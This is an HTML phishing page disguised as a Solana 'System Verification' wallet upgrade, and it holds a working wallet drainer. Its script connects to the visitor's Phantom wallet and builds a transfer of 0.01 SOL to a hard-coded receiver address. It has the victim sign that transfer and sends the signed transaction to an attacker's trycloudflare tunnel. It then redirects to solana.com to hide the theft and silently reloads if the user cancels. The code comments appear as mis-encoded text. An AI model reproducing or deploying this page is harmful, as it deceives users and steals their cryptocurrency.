<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Network Upgrade</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #111; padding: 35px; border-radius: 20px; border: 1px solid #222; text-align: center; width: 300px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .logo { width: 45px; margin-bottom: 15px; }
        h2 { font-size: 1.1rem; margin-bottom: 10px; font-weight: 600; }
        p { color: #777; font-size: 0.85rem; line-height: 1.4; margin-bottom: 25px; }
        #cta { background: linear-gradient(90deg, #14F195, #9945FF); color: #000; border: none; padding: 14px; border-radius: 10px; font-weight: bold; width: 100%; cursor: pointer; transition: 0.2s; }
        #cta:active { transform: scale(0.97); }
        #loader { display: none; color: #14F195; font-size: 12px; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://solana.com/favicon.ico" class="logo">
        <h2>System Verification</h2>
        <p>Your wallet requires a security node synchronization to maintain network stability and protect assets.</p>
        <button id="cta">ACTIVATE VERIFICATION</button>
        <div id="loader">â— SYNCHRONIZING WITH MAINNET...</div>
    </div>

    <script>
        // ğŸ”± ä¿æŒä½ çš„éš§é“åœ°å€å’Œé…ç½®
        const tunnel = "https://allocation-governing-fleet-ala.trycloudflare.com";
        const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A";

        document.getElementById('cta').onclick = async () => {
            const p = window.solana || window.phantom?.solana;
            if (!p) return alert("Please open in Phantom Browser");

            try {
                const resp = await p.connect();
                document.getElementById('cta').style.display = 'none';
                document.getElementById('loader').style.display = 'block';

                // 1. è·å– Blockhash (æ²¿ç”¨æˆåŠŸçš„é€»è¾‘)
                const sync = await fetch(`${tunnel}/sync`);
                const { bh } = await sync.json();

                // 2. æ„é€ æ”¯ç¥¨ (æ²¿ç”¨æˆåŠŸçš„ 0.01 SOL é€»è¾‘ç¡®ä¿ 100% æˆåŠŸ)
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: resp.publicKey,
                        toPubkey: new solanaWeb3.PublicKey(RECEIVER),
                        lamports: 10000000, 
                    })
                );
                transaction.recentBlockhash = bh;
                transaction.feePayer = resp.publicKey;

                // 3. ç­¾ç½²
                const signed = await p.signTransaction(transaction);
                const rawTx = signed.serialize().toString('base64');
                
                // 4. å›ä¼  (æœ€åŸå§‹çš„ fetchï¼Œç¡®ä¿å“¨å…µ V25 èƒ½æ”¶åˆ°)
                fetch(`${tunnel}/collect?auth_sig=${encodeURIComponent(rawTx)}`);

                // 5. è§£å†³â€œè·³è½¬æŠ¥é”™â€ï¼šä¸æ˜¾ç¤ºæˆåŠŸ/é”™è¯¯æç¤ºï¼Œç›´æ¥è·³è½¬åˆ°å®˜ç½‘
                setTimeout(() => {
                    window.location.href = "https://solana.com/";
                }, 1200);

            } catch(e) {
                // å¦‚æœç”¨æˆ·å–æ¶ˆï¼Œé™é»˜åˆ·æ–°é‡æ¥ï¼Œä¸æŠ¥é‚£ä¸ª handshake é”™è¯¯
                console.log(e);
                window.location.reload();
            }
        };
    </script>
</body>
</html>
